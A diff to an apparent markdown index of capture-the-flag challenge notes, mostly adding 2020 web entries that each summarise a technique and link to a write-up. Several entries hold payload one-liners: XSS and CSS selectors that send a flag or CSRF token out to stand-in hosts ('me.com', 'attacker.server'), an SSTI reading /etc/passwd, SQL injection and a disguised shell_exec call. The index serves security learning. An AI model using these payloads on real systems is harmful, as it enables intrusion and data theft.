@@ -11,7 +11,7 @@
 
 ## web <!-- {{{ -->
 <!-- 2014 {{{ -->
-<details><summary>2014</summary>
+<details><summary>2014</summary><p>
 
 ### web400 - confidence-ctf-teaser-2014
     use self-reference in serialized php to bypass $auth['hmac_t'] === $auth['hmac']
@@ -212,7 +212,7 @@
 
 <!-- }}} -->
 <!-- 2015 {{{ -->
-</details><details><summary>2015</summary>
+</p></details><details><summary>2015</summary><p>
 
 ### kummerkasten - 32c3-ctf-2015
     xss and jquery to retrieve admin pages
@@ -286,7 +286,7 @@
 
 <!-- }}} -->
 <!-- 2016 {{{ -->
-</details><details><summary>2015</summary>
+</p></details><details><summary>2016</summary><p>
 
 ### clue - backdoor-ctf-2016
     private github repo can be accessed through gh-pages `user.github.io/repo-name/flag`
@@ -477,7 +477,7 @@
 
 <!-- }}} -->
 <!-- 2017 {{{ -->
-</details><details><summary>2017</summary>
+</p></details><details><summary>2017</summary><p>
 
 ### artisinal shoutboxes - boston-key-party-2017
     chain 2 xss, first xss sets cookie with second xss payload to exfil admin page content
@@ -661,7 +661,7 @@
 
 <!-- }}} -->
 <!-- 2018 {{{ -->
-</details><details><summary>2018</summary>
+</p></details><details><summary>2018</summary><p>
 
 ### cool storage service - insomnihack-teaser-2018
     css selector to exfil csrf then upload php webshell with .pht extension
@@ -752,7 +752,7 @@
     use `gopher:///` or 301 redirect to gopher to bypass http/https check
     https://ctftime.org/task/7409
 
-### php -35c3-ctf-2018
+### php - 35c3-ctf-2018
     php unserialization and need to cause exception in unserialize via syntax error because object destructors arent called on exceptions
     https://ctftime.org/writeup/12773
 
@@ -772,7 +772,7 @@
 
 <!-- }}} -->
 <!-- 2019 {{{ -->
-</details><details><summary>2019</summary>
+</p></details><details><summary>2019</summary><p>
 
 ### bypasses everywhere - inshack-ctf-2019
     bypass xss auditor by splitting payload into 2 query params
@@ -879,7 +879,7 @@
 
 <!-- }}} -->
 <!-- 2020 {{{ -->
-</details><details><summary>2020</summary>
+</p></details><details><summary>2020</summary><p>
 
 ### defiltrate - insomnihack-teaser-2020
     java deserialisation with ysoserial and Runtime.exec trick to use redirections
@@ -921,6 +921,78 @@
     xs.js: `url='http://me.com/?'; fetch('file:///app/templates/flag.txt').then(r=>r.text()).then(t=>fetch(url+btoa(t)));`
     https://balsn.tw/ctf_writeup/20200314-confidencectf2020teaser/#temple-js-(unsolved)
 
+### newsletter - volga-ctf-quals-2020
+    symfony twig ssti arbitrary file read/write or rce
+    rce with `email="{{['cat${IFS}/etc/passwd']|filter('system')}}"@your.domain`
+    https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md
+    https://ctftime.org/task/10857
+
+### user center - volga-ctf-quals-2020
+    xss on subdomain via avatar upload with MIME type `*/*`
+    flag domain read from cookie so overwrite it with a path taking precedence
+    `document.cookie = "api_server=test.nl\uc040callback\uc040\uc040q; domain=.volgactf-task.ru; path=/profile.html";`
+    make `$.getJSON` issue JSONP request to us with `callback=?` in URL (app replaces non-printable with ?)
+    https://ctftime.org/writeup/19269
+
+### library - volga-ctf-quals-2020
+    graphql sqli escape closing ' with login=\\ so we can inject via email
+    `SELECT * FROM users WHERE login='\' OR email=' OR 1=1 -- '`
+    https://spotless.tech/volgactf-2020-qualifier-Library.html
+
+### netcorp - volga-ctf-quals-2010
+    tomcat9 vuln to ghostcat via 8009/tcp -> arbitrary file read, or rce via avatar upload
+    https://ctftime.org/task/10853
+
+### volgactf archive - volga-ctf-quals-2020
+    prssi, frame hijacking + dom clobbering
+    https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html
+
+### crossintheroof - midnightsun-ctf-quals-2020
+    dom xss, bypass body onload with many %0a so that setTimeout happens first
+    throw an error to escape try statement by declaring location after it's used
+    and execute js inside catch with `?xss=alert(1);let location=6`
+    https://ctftime.org/task/11104
+
+### notes app - bytebandits-ctf-2020
+    markdown2 `2.3.8` vuln to self-xss which can be exploited using 3 frames
+    https://ctftime.org/task/11164
+
+### yet another cat challenge - confidence-ctf-2020
+    csp bypass with `<meta http-equiv="refresh" content="0;URL=http://vuln/theme?=xss`
+    xss reads nonce with `document.querySelector(`script`).nonce` or `document.currentScript.nonce`
+    then create a new <script> tag to fetch and exfil flag
+    in updated version, nonce is removed with `document.scripts[0].remove()`
+    trigger a securitypolicyviolation event to retrieve nonce
+    https://balsn.tw/ctf_writeup/20200905-confidence2020ctffinals/
+
+### haha jail - confidence-ctf-2020
+    hhvm php sandbox, our source code cannot contain `shell_exec` but one possible bypass was
+    `echo call_user_func("shell_\x65xec","cat \x2fvar\x2fwww\x2f*lag* 1>&2");`
+    https://ctftime.org/task/12976
+
+### animal crossing - de1ctf-2020
+    waf bypass with `&data=;=%27||666//`
+    `var data=''||{"valueOf":new "".constructor.constructor('return 2')}+1//'`
+    then some js to make admin upload flag.png as an avatar
+    https://www.chainnews.com/articles/390680624719.htm
+
+### catalog - plaid-ctf-2020
+    csp bypass with `<meta http-equiv="refresh" />`
+    csrf a failed login to inject html in error message and redirect to flag page
+    exfil flag via Scroll To Text Fragment (STTF) and image lazy-loading
+    bypass user gesture requirement with uBlock Origin due to user activation always included
+    https://dttw.tech/posts/B19RXWzYL
+
+### mooz chat - plaid-ctf-2020
+    command injection in `convert -comment 'from ip %s' ..` on avatar images via `X-Forwarded-For`
+    leak jwt key to forge victim token
+    webrtc + mitm dh
+    https://github.com/koolkdev/ctf-writeups/tree/master/plaid2020/mooz-chat
+
+### contrived web problem - plaid-ctf-2020
+    ssrf and ftp client vuln to crlf in password, we can send commands to rabbitmq to exfil flag
+    https://ctftime.org/task/11323
+
 ### calc - de1ctf-2020
     java spel reflection with `?c='x'.class.forName('java.lang.System').getProperties()`
     ```
@@ -932,23 +1004,104 @@
     ```
     https://drive.google.com/file/d/1lzLa6el8UYTqKKhnegGpS4lN7Edl7EOo/view
 
-### animal crossing - de1ctf-2020
-    waf bypass with `&data=;=%27||666//`
-    `var data=''||{"valueOf":new "".constructor.constructor('return 2')}+1//'`
-    then some js to make admin upload flag.png as an avatar
-    https://www.chainnews.com/articles/390680624719.htm
-
 ### pooot - defcon-ctf-quals-2020
     register a service worker to exfil other requests issued by browser
     https://medium.com/@flohantk/pooot-writeup-217384a6b69c
 
-</details>
+### dogooos - defcon-ctf-quals-2020
+    python `str.format` with user-controlled format string -> leak globals
+    f-Strings using legacy `f()` instead of `f""`, implemented using eval() -> rce
+    https://ctftime.org/writeup/20654
+
+### uploooadit - defcon-ctf-quals-2020
+    http desync attack CL.TE between haproxy and gunicorn
+    https://ctftime.org/task/11590
+
+### where is my cash - alles-ctf-2020
+    xss in js var, no cache-control or max-age header, read cached response with `"cache":"force-cache"`
+    and exfil first api key, ssrf in node-html-pdf + sqli in insert to leak final api key
+    https://github.com/Super-Guesser/ctf/tree/master/ALLES%20CTF%202020/web/where_is_my_cash
+
+### push - alles-ctf-2020
+    http/2 server using HTTP Server Push, observe hidden requests using Chrome Net Export tool
+    https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf
+
+### onlyfreights - alles-ctf-2020
+    node/express app vuln to javascript prototype pollution
+    override shell and env to rce
+    https://ctftime.org/task/12965
+
+### watchers - pwn2win-ctf-2020
+    reDoS attack to make wappalyzer time out so that `shell_exec` output is empty to leak url to our uploaded page
+    xss due to insufficient regex for the AppDynamics package, bypass strict csp `default-src: none` with
+    `<script src="cid:adrum.1<img/src=a onerror=eval(atob('..'))"></script>`, avoid url encoding with `cid:`
+    https://ctftime.org/writeup/21015
+
+### wechat generator - 0ctf-2020
+    svg lfi with `<image href="text:/etc/passwd"/>`, xss bypass in an svg via `xlink:href` instead of `src`
+    https://ctftime.org/task/12152
+
+### easyphp & noeasyphp - 0ctf-2020
+    php eval sandboxed with disable_functions and open_basedir set to /var/www/html
+    bypass open_basedir with `foreach(new DirectoryIterator('glob:///*') as $f)`
+    load flag.so ffi extension with `$ffi = FFI::load('/flag.h');` and get flag with
+    `$a = $ffi->flag_fUn3t1on_fFi(); var_dump(FFI::string($a));`
+    https://hxp.io/blog/74/0CTF-2020-writeups/
+
+### webrtc - csaw-ctf-quals-2020
+    abuse turn server to proxy commands to internal redis server -> rce
+    https://ctftime.org/task/13011
+
+### flask_caching - csaw-ctf-quals-2020
+    uses pickle to serialize/deserialize data to/from redis
+    https://ctftime.org/writeup/23360
+
+### cookie clicker - downunder-ctf-2020
+    webapp uses cloud firestore database, use the rest api to retrieve all documents and find flag
+    https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker
+
+### design comp - downunder-ctf-2020
+    leak csrf token via css attribute selectors `[name="csrf"][value^="a"] {background: url(http://attacker.server/Aa} }`
+    however csrf input is hidden so use adjacent sibling node `[name="csrf"][value^="a"]~p{...}`
+    https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp
+
+### taking stock - downunder-ctf-2020
+    upload malicious joblib serialized model as profile pic and load it via directory traversal -> rce
+    https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock
+
+### fluxcloud frontline - hacklu-ctf-2020
+    bypass firewall via SNI set to allowed host but vhost set to secret host
+    bypass router via open redirect to open websocket connection to our client and access internal api
+    https://ctftime.org/task/13501
+
+### litter box - hacklu-ctf-2020
+    xss with race condition postMessage/onmessage to bypass `e.source == window.frames[0]` with `null == undefined => true`
+    https://krial057.github.io/blog/hack_lu_litter_box
+
+### harmony chat - dragon-ctf-2020
+    rce by sending serialized js in POST /csp-report, bypass localhost ip check via ftp active mode ssrf
+    https://ctftime.org/writeup/25058
+
+### scratchpad - dragon-ctf-2020
+    error-based xs search to bypass strict csp
+    https://ctftime.org/task/14022 https://blog.arxenix.dev/dragonctf-2020-scratchpad/
+
+### http-for-pros - defcamp-ctf-2020
+    ssti without `_` using `request[request.cookies['a']]` and `Cookie: "a": "__class__", ..`
+    https://ctftime.org/writeup/25264
+
+### more secure secrets - asis-ctf-finals-2020
+    php file upload race to find tmp filename, bypass open_basedir with `glob('///')`
+    bypass disable_functions by sending raw FastCGI packet to PHP-FPM tcp socket
+    https://ctftime.org/task/14265
+
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## mobile <!-- {{{ -->
-<!-- 2016 {{{ -->
-<details><summary>2016</summary>
+<!-- 2013-2017 {{{ -->
+<details><summary>2013-2017</summary><p>
 
 ### robot plans - hacklu-ctf-2013
     md5s of lock pattern for android (gesture hashes)
@@ -974,13 +1127,13 @@
     crack android lockscreen password from /data/system/password.key and device_policies.xml
     http://arishitz.net/writeup-secr3tmgr-forensic-insomnihack-2017/
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## crypto <!-- {{{ -->
-<!-- 2013-2014 {{{ -->
-<details><summary>2013-2014</summary>
+<!-- 2012-2014 {{{ -->
+<details><summary>2012-2014</summary><p>
 
 ### poli-ctf-2012
     ECC / ECDLP on anomalous curve
@@ -1231,7 +1384,7 @@
 
 <!-- }}} -->
 <!-- 2015 {{{ -->
-</details><details><summary>2015</summary>
+</p></details><details><summary>2015</summary><p>
 
 ### old cryptography - 0ctf-2015
     poly-alphabetic substitution with a non-uniform shift
@@ -1469,7 +1622,7 @@
 
 <!-- }}} -->
 <!-- 2016 {{{ -->
-</details><details><summary>2016</summary>
+</p></details><details><summary>2016</summary><p>
 
 ### collision course - backdoor-ctf-2016
     solve Merkle-Damgård-like hashing structure via bruteforce: test all x so that B0 == H(x) << 7
@@ -1813,7 +1966,7 @@
 
 <!-- }}} -->
 <!-- 2017 {{{ -->
-</details><details><summary>2017</summary>
+</p></details><details><summary>2017</summary><p>
 
 ### multi party computation - boston-key-party-2017
     paillier cryptosystem
@@ -1945,7 +2098,7 @@
 
 <!-- }}} -->
 <!-- 2018-2020 {{{ -->
-</details><details><summary>2018-2020</summary>
+</p></details><details><summary>2018-2020</summary><p>
 
 ### ssh - angstromctf-2018
     partially masked private key, we only have the high bits of q
@@ -1985,13 +2138,13 @@
     https://ctftime.org/writeup/10166
     https://balsn.tw/ctf_writeup/20180512-defconctfqual/#easy-pisy---crypto,-web
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## forensics <!-- {{{ -->
 <!-- 2014-2015 {{{ -->
-<details><summary>2014-2015</summary>
+<details><summary>2014-2015</summary><p>
 
 ### windows forensics - nuitduhack-ctf-quals-2014
     pagefile.sys
@@ -2067,7 +2220,7 @@
 
 <!-- }}} -->
 <!-- 2016-2020 {{{ -->
-</details><details><summary>2016-2020</summary>
+</p></details><details><summary>2016-2020</summary><p>
 
 ### dtune - backdoor-ctf-2016
     audio file with sounds of phone dial tones
@@ -2152,13 +2305,13 @@
     dns rebinding
     https://jctf.team/BSidesTLV-2018/Can-you-bypass-the-SOP/
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## stegano  <!-- {{{ -->
 <!-- 2014-2016 {{{ -->
-<details><summary>2014-2016</summary>
+<details><summary>2014-2016</summary><p>
 
 ### blocks - asis-ctf-quals-2014
     361x361 png image
@@ -2362,13 +2515,13 @@
     flag is in additional compressed data in each IDAT chunk
     https://codisec.com/tw-mma-2-2016-ninth/
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## exploit <!-- {{{ -->
 <!-- 2014-2016 {{{ -->
-<details><summary>2014-2016</summary>
+<details><summary>2014-2016</summary><p>
 
 ### python sandbox/jail escapes
     http://gynvael.coldwind.pl/n/python_sandbox_escape
@@ -2377,7 +2530,7 @@
     http://tasteless.eu/post/2014/01/phd-ctf-quals-2014-pyjail/
     http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/
 
-### 4stone -doraemon - codegate-preliminary-2014
+### 4stone-doraemon - codegate-preliminary-2014
     disable aslr with ulimit -s unlimited
     gdb trick to find location of tls block (to overwrite location of kernel_vsyscall)
     shellcode in env with shortjumps (\xeb\02) to jump over env var key and equal sign
@@ -2426,13 +2579,13 @@
 ### quine - icectf-2016
     service accepts C code and runs it
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## reverse <!-- {{{ -->
 <!-- 2014-2016 {{{ -->
-<details><summary>2014-2016</summary>
+<details><summary>2014-2016</summary><p>
 
 ### chrono logical - codegate-preliminary-2014
     disable timeout in select with setarch -T
@@ -2461,13 +2614,13 @@
     boot vm on gparted iso to copy mbr to disk, then remote gdb of vmware vm
     https://securite.intrinsec.com/2016/04/03/write-up-nuit-du-hack-2016-ctf-quals-matriochka-step-4/
 
-</details>
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## misc <!-- {{{ -->
 <!-- 2014-2016 {{{ -->
-<details><summary>2014-2016</summary>
+<details><summary>2014-2016</summary><p>
 
 ### gunslinger - hacklu-ctf-2014
     restricted bash shell (no alpha chars allowed)
@@ -2556,12 +2709,16 @@
     encoded in punycode (xn--), write loop to decode and replace unicode characters
     https://www.id0.one/blog/content/3.bp.html
 
-</details>
+### bashell - alles-ctf-2020
+    bash commands with only `[]$<\_`
+    https://github.com/benjaminjkraft/junk/blob/master/bashell.py
+
+</p></details>
 <!-- }}} -->
 <!-- }}} -->
 
 ## todo <!-- {{{ -->
-<details><summary>list</summary>
+<details><summary>list</summary><p>
 
 * [x] pico-ctf-2013
 * [x] boston-key-party-2014
@@ -2722,8 +2879,8 @@
 * [x] 34c3-ctf-2017
 * [x] 2018 weight >= 25
 * [x] 2019 weight >= 25
-* [ ] 2020 weight >= 25
-</details>
+* [x] 2020 weight > 25
+</p></details>
 <!-- }}} -->
 
 ## moar <!-- {{{ -->
